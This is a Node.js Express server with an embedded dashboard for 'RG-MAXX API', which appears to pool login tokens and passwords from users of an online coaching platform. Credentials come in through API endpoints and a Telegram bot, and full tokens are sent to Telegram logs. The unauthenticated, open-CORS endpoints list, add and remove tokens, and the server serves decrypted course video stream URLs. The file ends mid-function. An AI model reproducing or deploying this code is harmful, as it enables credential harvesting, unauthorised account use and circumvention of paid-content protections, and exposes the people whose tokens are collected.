// server.js — RG-MAXX API v11
// ✅ FIX: node-fetch REMOVED — native fetch (Node 18+)
// ✅ FIX: app.listen() only on local — Vercel pe export default app
// ✅ FIX: loadManualUsers() lazy init — pehli request pe run hota hai
// ✅ Full token in Telegram logs
// ✅ Auto batch add from users.js
// ✅ Telegram Tokens section
// ✅ Token KeepAlive (local only)

import "dotenv/config";
import express from "express";
import { BASE_URL, makeHeaders, decrypt } from "./lib/config.js";
import {
  addToken, removeToken, getAllTokens,
  getTokenCount, getToken, getAnyToken,
  getTokenForBatch, clearPool, updateBatches,
  getTelegramTokens, getManualTokens,
} from "./lib/tokenStore.js";
import { smartFetch } from "./lib/smartFetch.js";
import { fetchUserBatches, loginWithCredentials } from "./lib/fetchBatches.js";
import {
  sendLog, buildLoginLog,
  processTelegramUpdate, setWebhook,
  getTodayLoginCount, getLogHistory,
} from "./lib/telegram.js";
import { startKeepAlive, getTokenHealth } from "./lib/tokenKeepAlive.js";
import { MANUAL_USERS } from "./users.js";

const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// ══════════════════════════════════════════════════════════════════════════════
// ✅ LAZY INIT — Vercel pe module-level async code crash karta hai
// Pehli request pe ek baar run hoga, phir skip
// ══════════════════════════════════════════════════════════════════════════════
let initialized = false;

async function ensureInit() {
  if (initialized) return;
  initialized = true;
  await loadManualUsers();
  startKeepAlive();
}

async function loadManualUsers() {
  const valid = MANUAL_USERS.filter(
    (u) => u.userId && u.token &&
      !(u.token.startsWith("TOKEN_") && u.token.endsWith("_YAHAN_PASTE_KARO"))
  );
  if (valid.length === 0) { console.log("📋 No manual users defined in users.js"); return; }
  console.log(`\n📋 Loading ${valid.length} users from users.js...`);

  const results = await Promise.allSettled(
    valid.map(async (u) => {
      const batches = await fetchUserBatches(u.userId, u.token);
      addToken(u.userId, u.token, u.name || "", batches, "manual");
      return { userId: u.userId, batches: batches.length };
    })
  );
  const loaded = results.filter((r) => r.status === "fulfilled").length;
  console.log(`✅ ${loaded}/${valid.length} manual users loaded\n`);
}

// ══════════════════════════════════════════════════════════════════════════════
// MIDDLEWARE — ensure init on every request
// ══════════════════════════════════════════════════════════════════════════════
app.use(async (req, res, next) => {
  try { await ensureInit(); } catch (e) { console.error("[Init]", e.message); }
  next();
});

// ══════════════════════════════════════════════════════════════════════════════
// HOME — V11 DASHBOARD UI
// ══════════════════════════════════════════════════════════════════════════════
app.get("/", (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>RG-MAXX API v11</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#060b14;--bg2:#0a1120;--surface:#0d1628;--card:#0f1c30;--card2:#111f33;
  --border:#1b2d45;--border2:#243a55;--accent:#4f8ef7;--accent2:#00e5ff;
  --accent3:#a78bfa;--green:#00e676;--red:#ff4f5e;--yellow:#ffc400;
  --orange:#ff7043;--pink:#f472b6;--text:#e2eaf5;--text2:#8ba0bc;--muted:#4a6080;
  --glow:rgba(79,142,247,0.15);--card-shadow:0 4px 24px rgba(0,0,0,0.4);
}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html{scroll-behavior:smooth;height:100%}
body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
::-webkit-scrollbar{width:3px;height:3px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border2);border-radius:10px}
.statusbar{height:env(safe-area-inset-top,0px);background:var(--bg2)}
.nav{background:rgba(10,17,32,0.95);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid var(--border);padding:0 16px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:300}
.nav-brand{display:flex;align-items:center;gap:10px}
.nav-logo{width:36px;height:36px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:10px;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-size:1rem;font-weight:800;color:#fff;box-shadow:0 0 20px rgba(79,142,247,0.5);flex-shrink:0}
.nav-title{font-family:'Syne',sans-serif;font-size:1rem;font-weight:800;background:linear-gradient(90deg,#fff,var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-.3px}
.nav-badge{background:linear-gradient(135deg,var(--accent),var(--accent3));color:#fff;font-size:.55rem;padding:2px 6px;border-radius:6px;font-weight:800;letter-spacing:.5px;margin-left:4px;vertical-align:middle}
.nav-right{display:flex;align-items:center;gap:8px}
.live-pill{display:flex;align-items:center;gap:5px;background:rgba(0,230,118,.08);border:1px solid rgba(0,230,118,.2);padding:4px 10px;border-radius:20px;font-size:.68rem;color:var(--green);font-weight:700;letter-spacing:.3px}
.pulse-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse 2s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
.token-pill{display:flex;align-items:center;gap:4px;background:var(--surface);border:1px solid var(--border);padding:4px 10px;border-radius:20px;font-size:.72rem;color:var(--text2);font-weight:600}
.tp-num{color:var(--accent);font-weight:800}
.hero{padding:24px 16px 20px;background:linear-gradient(180deg,var(--bg2) 0%,var(--bg) 100%);border-bottom:1px solid var(--border);position:relative;overflow:hidden}
.hero::before{content:'';position:absolute;top:-60px;right:-40px;width:200px;height:200px;background:radial-gradient(circle,rgba(79,142,247,.12),transparent 70%);pointer-events:none}
.hero-tag{display:inline-flex;align-items:center;gap:5px;background:rgba(79,142,247,.1);border:1px solid rgba(79,142,247,.25);padding:3px 10px;border-radius:20px;font-size:.62rem;font-weight:700;color:var(--accent);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:10px}
.hero-title{font-family:'Syne',sans-serif;font-size:1.7rem;font-weight:800;line-height:1.1;background:linear-gradient(135deg,#fff 30%,var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
.hero-sub{font-size:.78rem;color:var(--text2);line-height:1.6}
.stats-scroll{display:flex;gap:10px;padding:14px 16px;overflow-x:auto;border-bottom:1px solid var(--border);scrollbar-width:none}
.stats-scroll::-webkit-scrollbar{display:none}
.stat-chip{flex-shrink:0;background:var(--card);border:1px solid var(--border);border-radius:14px;padding:12px 16px;min-width:100px;text-align:center;transition:all .2s}
.stat-chip:hover{border-color:var(--accent);transform:translateY(-1px)}
.stat-num{font-family:'Syne',sans-serif;font-size:1.6rem;font-weight:800;line-height:1;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
.stat-lbl{font-size:.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:.8px;font-weight:600}
.bottom-nav{position:fixed;bottom:0;left:0;right:0;background:rgba(10,17,32,0.97);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-top:1px solid var(--border);display:flex;padding:8px 0 max(8px,env(safe-area-inset-bottom));z-index:300}
.bn-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;padding:4px 0;cursor:pointer;border:none;background:transparent;transition:all .2s}
.bn-icon{font-size:1.2rem;line-height:1}
.bn-label{font-size:.58rem;font-weight:600;color:var(--muted);letter-spacing:.3px;text-transform:uppercase;transition:color .2s}
.bn-item.active .bn-label{color:var(--accent)}
.bn-item.active .bn-icon{filter:drop-shadow(0 0 6px var(--accent))}
.bn-indicator{width:4px;height:4px;border-radius:50%;background:var(--accent);box-shadow:0 0 6px var(--accent);opacity:0;transition:opacity .2s;margin-top:1px}
.bn-item.active .bn-indicator{opacity:1}
.main{padding:0 0 80px;max-width:600px;margin:0 auto}
.panel{display:none}.panel.active{display:block}
.sec-header{display:flex;align-items:center;justify-content:space-between;padding:16px 16px 10px}
.sec-title{font-family:'Syne',sans-serif;font-size:.78rem;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--accent2);display:flex;align-items:center;gap:6px}
.sec-title::before{content:'';width:3px;height:14px;background:linear-gradient(var(--accent),var(--accent2));border-radius:2px}
.refresh-btn{background:var(--surface);border:1px solid var(--border);color:var(--text2);padding:5px 12px;border-radius:8px;cursor:pointer;font-size:.72rem;font-weight:600;display:flex;align-items:center;gap:5px;transition:all .2s}
.refresh-btn:hover{border-color:var(--accent);color:var(--accent)}
.batch-list{padding:0 16px;display:flex;flex-direction:column;gap:10px}
.batch-card{background:var(--card);border:1px solid var(--border);border-radius:14px;overflow:hidden;display:flex;align-items:center;gap:12px;padding:10px;transition:all .25s}
.batch-card:hover{border-color:var(--accent);box-shadow:0 4px 20px rgba(79,142,247,.1)}
.batch-thumb{width:60px;height:60px;border-radius:10px;object-fit:cover;flex-shrink:0;background:linear-gradient(135deg,var(--surface),var(--border))}
.batch-thumb-ph{width:60px;height:60px;border-radius:10px;background:linear-gradient(135deg,#1a2d45,#0d1628);display:flex;align-items:center;justify-content:center;font-size:1.4rem;flex-shrink:0}
.batch-info{flex:1;min-width:0}
.batch-id{font-size:.6rem;font-weight:700;color:var(--accent2);letter-spacing:.5px;text-transform:uppercase;margin-bottom:3px}
.batch-name{font-size:.82rem;font-weight:600;color:var(--text);line-height:1.3;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;margin-bottom:4px}
.batch-exp{font-size:.66rem;color:var(--muted);display:flex;align-items:center;gap:3px}
.exp-dot{width:5px;height:5px;border-radius:50%;background:var(--green);flex-shrink:0}
.user-list{padding:0 16px;display:flex;flex-direction:column;gap:10px}
.user-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;transition:all .2s}
.user-card:hover{border-color:var(--accent);box-shadow:0 4px 20px rgba(79,142,247,.1)}
.user-top{display:flex;align-items:center;gap:10px;margin-bottom:10px}
.user-avatar{width:40px;height:40px;border-radius:11px;background:linear-gradient(135deg,var(--accent),var(--accent3));display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-size:1rem;font-weight:800;color:#fff;flex-shrink:0;box-shadow:0 4px 12px rgba(79,142,247,.3)}
.user-name{font-size:.88rem;font-weight:700;color:var(--text);margin-bottom:2px}
.user-id{font-size:.68rem;color:var(--muted);font-family:'Courier New',monospace}
.src-badge{margin-left:auto;flex-shrink:0;padding:2px 8px;border-radius:6px;font-size:.6rem;font-weight:800;letter-spacing:.5px;text-transform:uppercase}
.src-manual{background:rgba(0,230,118,.08);color:var(--green);border:1px solid rgba(0,230,118,.2)}
.src-telegram{background:rgba(0,229,255,.08);color:var(--accent2);border:1px solid rgba(0,229,255,.2)}
.src-login{background:rgba(79,142,247,.08);color:var(--accent);border:1px solid rgba(79,142,247,.2)}
.src-api{background:rgba(167,139,250,.08);color:var(--accent3);border:1px solid rgba(167,139,250,.2)}
.src-bulk{background:rgba(255,196,0,.08);color:var(--yellow);border:1px solid rgba(255,196,0,.2)}
.token-row{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 10px;display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:8px}
.token-text{font-family:'Courier New',monospace;font-size:.65rem;color:var(--text2);word-break:break-all;flex:1;line-height:1.4}
.copy-btn{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;padding:4px 10px;border-radius:6px;cursor:pointer;font-size:.65rem;font-weight:700;flex-shrink:0;transition:all .2s;font-family:'DM Sans',sans-serif}
.copy-btn:hover{opacity:.85;transform:scale(.97)}
.copy-btn.copied{background:linear-gradient(135deg,var(--green),#00bfa5);color:#000}
.user-meta{display:flex;flex-wrap:wrap;gap:8px}
.meta-pill{display:flex;align-items:center;gap:4px;background:var(--surface);border:1px solid var(--border);padding:3px 8px;border-radius:6px;font-size:.68rem;color:var(--text2)}
.meta-pill strong{color:var(--accent2)}
.health-bar{height:3px;border-radius:3px;background:var(--border);overflow:hidden;margin-top:10px}
.health-fill{height:100%;border-radius:3px;background:var(--green);transition:width .5s}
.tg-overview{margin:0 16px 12px;background:linear-gradient(135deg,rgba(0,229,255,.06),rgba(79,142,247,.04));border:1px solid rgba(0,229,255,.2);border-radius:14px;padding:14px 16px}
.tg-title{font-family:'Syne',sans-serif;font-size:.72rem;font-weight:800;color:var(--accent2);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:6px}
.tg-stats{display:flex;flex-wrap:wrap;gap:8px}
.tg-stat-item{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 12px;flex:1;min-width:80px;text-align:center}
.tg-stat-num{font-family:'Syne',sans-serif;font-size:1.2rem;font-weight:800;color:var(--accent2)}
.tg-stat-lbl{font-size:.58rem;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:1px}
.log-feed{padding:0 16px;display:flex;flex-direction:column;gap:8px}
.log-entry{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:10px 12px;border-left:3px solid var(--accent)}
.log-entry.source-telegram{border-left-color:var(--accent2)}
.log-entry.source-manual{border-left-color:var(--green)}
.log-entry.source-id_pass{border-left-color:var(--accent3)}
.log-top{display:flex;align-items:center;gap:6px;margin-bottom:5px}
.log-uid{font-size:.72rem;font-weight:700;color:var(--text);font-family:'Courier New',monospace}
.log-src{font-size:.58rem;padding:1px 6px;border-radius:4px;font-weight:700}
.log-time{margin-left:auto;font-size:.6rem;color:var(--muted)}
.log-token{font-size:.62rem;color:var(--text2);font-family:'Courier New',monospace;word-break:break-all;margin-bottom:4px}
.log-batches{font-size:.66rem;color:var(--muted)}
.api-list{padding:0 16px;display:flex;flex-direction:column;gap:8px}
.api-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px 14px;transition:all .2s}
.api-card:hover{border-color:var(--accent);transform:translateX(2px)}
.api-top{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:6px}
.method{padding:2px 8px;border-radius:5px;font-size:.62rem;font-weight:900;letter-spacing:.8px;flex-shrink:0}
.GET{background:rgba(0,229,255,.08);color:var(--accent2);border:1px solid rgba(0,229,255,.2)}
.POST{background:rgba(0,230,118,.08);color:var(--green);border:1px solid rgba(0,230,118,.2)}
.endpoint{font-family:'Courier New',monospace;font-size:.75rem;color:#a78bfa;word-break:break-all;flex:1}
.api-desc{color:var(--text2);font-size:.75rem;line-height:1.5;margin-bottom:4px}
.api-params{font-size:.68rem;color:var(--yellow);margin-top:2px}
.try-btn{background:var(--surface);border:1px solid var(--border);color:var(--accent);padding:3px 10px;border-radius:6px;cursor:pointer;font-size:.65rem;font-weight:700;transition:all .2s;margin-top:4px}
.try-btn:hover{border-color:var(--accent);background:rgba(79,142,247,.08)}
.new-tag{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;font-size:.55rem;padding:1px 6px;border-radius:5px;font-weight:800;margin-left:auto;flex-shrink:0}
.api-response{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:10px 12px;margin-top:8px;font-size:.68rem;font-family:'Courier New',monospace;color:#94a3b8;line-height:1.6;overflow-x:auto;max-height:200px;overflow-y:auto;display:none}
.api-response.visible{display:block}
.info-box{margin:0 16px 12px;background:linear-gradient(135deg,rgba(79,142,247,.06),rgba(167,139,250,.04));border:1px solid rgba(79,142,247,.2);border-radius:14px;padding:14px 16px}
.info-title{color:var(--accent2);font-size:.78rem;font-weight:700;margin-bottom:8px;font-family:'Syne',sans-serif}
pre{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:10px 12px;font-size:.68rem;overflow-x:auto;color:#94a3b8;font-family:'Courier New',monospace;margin-top:8px;line-height:1.6}
code{background:rgba(79,142,247,.1);color:#a78bfa;padding:1px 5px;border-radius:4px;font-size:.75rem;font-family:'Courier New',monospace}
.loader{display:flex;align-items:center;justify-content:center;padding:40px 20px;color:var(--muted);font-size:.8rem;gap:8px}
.spin{width:16px;height:16px;border-radius:50%;border:2px solid var(--border);border-top-color:var(--accent);animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.empty{text-align:center;padding:50px 20px;color:var(--muted)}
.empty-icon{font-size:2.5rem;margin-bottom:10px;opacity:.4}
.health-grid{padding:0 16px;display:flex;flex-direction:column;gap:10px}
.health-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:12px 14px}
.health-top{display:flex;align-items:center;gap:10px;margin-bottom:8px}
.health-status-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1rem;flex-shrink:0}
.health-meta{font-size:.68rem;color:var(--muted);display:flex;gap:10px;flex-wrap:wrap}
.divider{font-size:.62rem;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--muted);padding:14px 16px 6px;display:flex;align-items:center;gap:8px}
.divider::after{content:'';flex:1;height:1px;background:var(--border)}
@media(min-width:600px){
  .batch-list,.user-list,.api-list,.log-feed,.health-grid{display:grid;grid-template-columns:1fr 1fr}
  .batch-card,.user-card,.api-card,.log-entry,.health-card{width:100%}
}
</style>
</head>
<body>
<div class="statusbar"></div>
<nav class="nav">
  <div class="nav-brand">
    <div class="nav-logo">R</div>
    <span class="nav-title">RG‑MAXX <span class="nav-badge">V11</span></span>
  </div>
  <div class="nav-right">
    <div class="token-pill"><span class="tp-num" id="nav-tc">—</span> tokens</div>
    <div class="live-pill"><div class="pulse-dot"></div>LIVE</div>
  </div>
</nav>
<div class="hero">
  <div class="hero-tag">⚡ RG Vikramjeet Platform</div>
  <div class="hero-title">RG‑MAXX API</div>
  <div class="hero-sub">Token Pool · Auto Batches · 24/7 KeepAlive · Telegram Bot</div>
</div>
<div class="stats-scroll" id="stats-row">
  <div class="stat-chip"><div class="stat-num" id="s-total">—</div><div class="stat-lbl">Tokens</div></div>
  <div class="stat-chip"><div class="stat-num" id="s-manual">—</div><div class="stat-lbl">Manual</div></div>
  <div class="stat-chip"><div class="stat-num" id="s-tg">—</div><div class="stat-lbl">Telegram</div></div>
  <div class="stat-chip"><div class="stat-num" id="s-batches">—</div><div class="stat-lbl">Batches</div></div>
  <div class="stat-chip"><div class="stat-num" id="s-today">—</div><div class="stat-lbl">Today</div></div>
  <div class="stat-chip"><div class="stat-num" id="s-bot" style="font-size:1.2rem">—</div><div class="stat-lbl">Bot</div></div>
</div>
<div class="main">
  <div class="panel active" id="panel-batches">
    <div class="sec-header">
      <div class="sec-title">All Batches</div>
      <button class="refresh-btn" onclick="loadBatches()">↻ Refresh</button>
    </div>
    <div id="batches-container"><div class="loader"><div class="spin"></div>Loading batches...</div></div>
  </div>
  <div class="panel" id="panel-users">
    <div class="sec-header">
      <div class="sec-title">Token Pool</div>
      <button class="refresh-btn" onclick="loadUsers()">↻ Refresh</button>
    </div>
    <div id="users-container"><div class="loader"><div class="spin"></div>Loading...</div></div>
  </div>
  <div class="panel" id="panel-telegram">
    <div class="sec-header">
      <div class="sec-title">Telegram Tokens</div>
      <button class="refresh-btn" onclick="loadTelegram()">↻ Refresh</button>
    </div>
    <div class="tg-overview">
      <div class="tg-title">📊 Telegram Stats</div>
      <div class="tg-stats">
        <div class="tg-stat-item"><div class="tg-stat-num" id="tg-total">—</div><div class="tg-stat-lbl">TG Tokens</div></div>
        <div class="tg-stat-item"><div class="tg-stat-num" id="tg-users">—</div><div class="tg-stat-lbl">User IDs</div></div>
        <div class="tg-stat-item"><div class="tg-stat-num" id="tg-batches">—</div><div class="tg-stat-lbl">Batches</div></div>
        <div class="tg-stat-item"><div class="tg-stat-num" id="tg-today">—</div><div class="tg-stat-lbl">Today</div></div>
      </div>
    </div>
    <div class="divider">🤖 Bot Tokens</div>
    <div id="tg-tokens-container"><div class="loader"><div class="spin"></div>Loading...</div></div>
    <div class="divider">📋 Recent Logs</div>
    <div id="tg-logs-container"><div class="loader"><div class="spin"></div>Loading logs...</div></div>
  </div>
  <div class="panel" id="panel-health">
    <div class="sec-header">
      <div class="sec-title">Token Health</div>
      <button class="refresh-btn" onclick="loadHealth()">↻ Refresh</button>
    </div>
    <div class="info-box" style="background:rgba(0,230,118,.04);border-color:rgba(0,230,118,.2)">
      <div class="info-title">💓 24/7 KeepAlive System</div>
      <div style="font-size:.78rem;color:var(--text2);line-height:1.7">
        Server har <strong style="color:var(--green)">25 min</strong> pe silently sab tokens ko ping karta hai.<br>
        3 baar fail → auto remove + Telegram alert.<br>
        Manual users kabhi remove nahi hote.
      </div>
    </div>
    <div id="health-container"><div class="loader"><div class="spin"></div>Loading health...</div></div>
  </div>
  <div class="panel" id="panel-api">
    <div class="sec-header"><div class="sec-title">API Reference</div></div>
    <div class="info-box">
      <div class="info-title">🚀 v11 — Native Fetch + Vercel 100% Fix</div>
      <pre>// Login with mobile+password
POST /api/login
{ "mobile": "9876543210", "password": "yourpass" }

// Add token directly
POST /api/login
{ "userId": "123456", "token": "eyJ..." }

// Telegram Bot
/login 9876543210 yourpassword
/add 123456 eyJ0eXAi...</pre>
    </div>
    <div class="divider">🔐 Auth</div>
    <div class="api-list">
      <div class="api-card">
        <div class="api-top"><span class="method POST">POST</span><span class="endpoint">/api/login</span><span class="new-tag">v11</span></div>
        <div class="api-desc">ID+Password ya Token se login. Batches auto-fetch.</div>
        <button class="try-btn" onclick="tryApiResp(this,'/api/login','POST',{mobile:'TEST',password:'TEST'})">▶ Try</button>
        <div class="api-response"></div>
      </div>
      <div class="api-card">
        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/add-token</span></div>
        <div class="api-desc">URL se token add karo</div>
        <div class="api-params">?userid=123&token=eyJ...</div>
      </div>
      <div class="api-card">
        <div class="api-top"><span class="method POST">POST</span><span class="endpoint">/api/bulk-login</span></div>
        <div class="api-desc">Array of {userId, token} — bulk add</div>
      </div>
    </div>
    <div class="divider">👥 Pool</div>
    <div class="api-list">
      <div class="api-card">
        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/users</span></div>
        <div class="api-desc">All users — source, batches, health</div>
        <button class="try-btn" onclick="tryApiResp(this,'/api/users','GET')">▶ Try</button>
        <div class="api-response"></div>
      </div>
      <div class="api-card">
        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/status</span></div>
        <div class="api-desc">Server status, token count, bot status</div>
        <button class="try-btn" onclick="tryApiResp(this,'/api/status','GET')">▶ Try</button>
        <div class="api-response"></div>
      </div>
      <div class="api-card">
        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/health</span></div>
        <div class="api-desc">Token health (ping failures)</div>
        <button class="try-btn" onclick="tryApiResp(this,'/api/health','GET')">▶ Try</button>
        <div class="api-response"></div>
      </div>
      <div class="api-card">
        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/telegram-stats</span></div>
        <div class="api-desc">Telegram tokens + logs</div>
        <button class="try-btn" onclick="tryApiResp(this,'/api/telegram-stats','GET')">▶ Try</button>
        <div class="api-response"></div>
      </div>
      <div class="api-card">
        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/remove-token</span></div>
        <div class="api-params">?userid=123</div>
      </div>
      <div class="api-card">
        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/reload-users</span></div>
        <div class="api-params">?secret=YOUR_SECRET</div>
      </div>
    </div>
    <div class="divider">📚 Content</div>
    <div class="api-list">
      <div class="api-card">
        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/all-batches</span></div>
        <div class="api-desc">All unique batches (no duplicates)</div>
        <button class="try-btn" onclick="tryApiResp(this,'/api/all-batches','GET')">▶ Try</button>
        <div class="api-response"></div>
      </div>
      <div class="api-card"><div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/subjects</span></div><div class="api-params">?courseid=257</div></div>
      <div class="api-card"><div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/topics</span></div><div class="api-params">?courseid=257&subjectid=1</div></div>
      <div class="api-card"><div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/concepts</span></div><div class="api-params">?courseid=257&subjectid=1&topicid=1</div></div>
      <div class="api-card"><div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/videos</span></div><div class="api-params">?courseid=257&subjectid=1&topicid=1&conceptid=1</div></div>
      <div class="api-card"><div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/video-details</span></div><div class="api-desc">Decrypted stream URLs</div><div class="api-params">?course_id=257&video_id=12345</div></div>
    </div>
    <div class="divider">🤖 Telegram Bot</div>
    <div class="info-box" style="background:rgba(0,229,255,.04);border-color:rgba(0,229,255,.2);margin-bottom:12px">
      <div class="info-title">Bot Commands</div>
      <pre>/start              — Help
/login MOBILE PASS  — ID+Password login
/add USER_ID TOKEN  — Token add
/remove USER_ID     — Token remove
/disconnect         — Telegram tokens saare hatao
/status             — Pool status</pre>
    </div>
    <div class="api-list" style="margin-bottom:16px">
      <div class="api-card">
        <div class="api-top"><span class="method GET">GET</span><span class="endpoint">/api/set-webhook</span></div>
        <div class="api-desc">One-time setup — webhook register karo</div>
        <button class="try-btn" onclick="tryApiResp(this,'/api/set-webhook','GET')">▶ Setup</button>
        <div class="api-response"></div>
      </div>
    </div>
  </div>
</div>
<nav class="bottom-nav">
  <button class="bn-item active" onclick="switchTab('batches',this)">
    <div class="bn-icon">📚</div><div class="bn-label">Batches</div><div class="bn-indicator"></div>
  </button>
  <button class="bn-item" onclick="switchTab('users',this)">
    <div class="bn-icon">👥</div><div class="bn-label">Users</div><div class="bn-indicator"></div>
  </button>
  <button class="bn-item" onclick="switchTab('telegram',this)">
    <div class="bn-icon">🤖</div><div class="bn-label">Telegram</div><div class="bn-indicator"></div>
  </button>
  <button class="bn-item" onclick="switchTab('health',this)">
    <div class="bn-icon">💓</div><div class="bn-label">Health</div><div class="bn-indicator"></div>
  </button>
  <button class="bn-item" onclick="switchTab('api',this)">
    <div class="bn-icon">📖</div><div class="bn-label">API</div><div class="bn-indicator"></div>
  </button>
</nav>
<script>
function switchTab(name,btn){
  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
  document.querySelectorAll('.bn-item').forEach(b=>b.classList.remove('active'));
  document.getElementById('panel-'+name).classList.add('active');
  btn.classList.add('active');
  if(name==='batches') loadBatches();
  else if(name==='users') loadUsers();
  else if(name==='telegram') loadTelegram();
  else if(name==='health') loadHealth();
  window.scrollTo({top:0,behavior:'smooth'});
}
async function initStats(){
  try{
    const [st,us,tg]=await Promise.all([
      fetch('/api/status').then(r=>r.json()).catch(()=>({})),
      fetch('/api/users').then(r=>r.json()).catch(()=>({})),
      fetch('/api/telegram-stats').then(r=>r.json()).catch(()=>({})),
    ]);
    document.getElementById('nav-tc').textContent=st.tokens||0;
    document.getElementById('s-total').textContent=st.tokens||0;
    document.getElementById('s-manual').textContent=us.manual||0;
    document.getElementById('s-tg').textContent=tg.telegram_count||0;
    document.getElementById('s-today').textContent=tg.today_logins||0;
    document.getElementById('s-bot').textContent=st.telegram_bot?'✅':'❌';
  }catch(e){}
}
async function loadBatches(){
  const el=document.getElementById('batches-container');
  el.innerHTML='<div class="loader"><div class="spin"></div>Fetching from all tokens...</div>';
  try{
    const data=await fetch('/api/all-batches').then(r=>r.json());
    document.getElementById('s-batches').textContent=data.total||0;
    if(!data.data||data.data.length===0){el.innerHTML='<div class="empty"><div class="empty-icon">📭</div><div>No batches. Token add karo.</div></div>';return;}
    el.innerHTML='<div class="batch-list">'+data.data.map(b=>{
      const expiry=b.expiry?new Date(b.expiry).toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'}):'';
      const thumbHtml=b.thumbnail?`<img class="batch-thumb" src="${b.thumbnail}" alt="" loading="lazy" onerror="this.style.display='none';this.nextSibling.style.display='flex'">`:'' ;
      const phDisplay=b.thumbnail?'style="display:none"':'';
      return`<div class="batch-card">${thumbHtml}<div class="batch-thumb-ph" ${phDisplay}>📚</div><div class="batch-info"><div class="batch-id">ID: ${b.id}</div><div class="batch-name">${b.name||'Unknown Batch'}</div>${expiry?`<div class="batch-exp"><div class="exp-dot"></div>${expiry}</div>`:''}</div></div>`;
    }).join('')+'</div>';
  }catch(e){el.innerHTML='<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading batches.</div></div>';}
}
async function loadUsers(){
  const el=document.getElementById('users-container');
  el.innerHTML='<div class="loader"><div class="spin"></div>Loading users...</div>';
  try{
    const data=await fetch('/api/users').then(r=>r.json());
    if(!data.users||data.users.length===0){el.innerHTML='<div class="empty"><div class="empty-icon">👥</div><div>No users in pool.</div></div>';return;}
    const srcCls={manual:'src-manual',telegram:'src-telegram',login:'src-login',api:'src-api',bulk:'src-bulk'};
    el.innerHTML='<div class="user-list">'+data.users.map((u,i)=>{
      const av=(u.name||u.userId||'?')[0].toUpperCase();
      const cls=srcCls[u.source]||'src-api';
      const addedDate=u.addedAt?new Date(u.addedAt).toLocaleDateString('en-IN'):'—';
